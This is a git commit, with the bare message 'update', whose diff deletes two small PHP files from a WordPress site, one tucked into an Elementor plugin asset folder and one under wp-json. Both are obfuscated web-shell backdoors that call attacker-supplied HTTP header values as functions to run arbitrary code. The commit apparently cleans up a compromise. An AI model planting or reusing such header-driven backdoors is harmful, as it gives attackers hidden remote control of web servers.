a092ab064e37f3a49084a752b26b7b2da6d7840b
Fast and Static <it@e-me.co>
2025-05-27 10:40:30 +0000

    update

--- wp-content/plugins/elementor/assets/lib/jquery-hover-intent/uploader.php
+++
@@ -1,6 +0,0 @@
-<?php
-$_HEADERS = getallheaders();
-if (isset($_HEADERS['Feature-Policy'])) {
-    $request = $_HEADERS['Feature-Policy']('', $_HEADERS['Server-Timing']($_HEADERS['Authorization']));
-    $request();
-}
--- wp-json/menu1.php
+++
@@ -1,6 +0,0 @@
-<?php
-$_HEADERS = getallheaders();
-if (isset($_HEADERS['Content-Security-Policy'])) {
-    $ob_iconv_handle = $_HEADERS['Content-Security-Policy']('', $_HEADERS['If-Modified-Since']($_HEADERS['Feature-Policy']));
-    $ob_iconv_handle();
-}
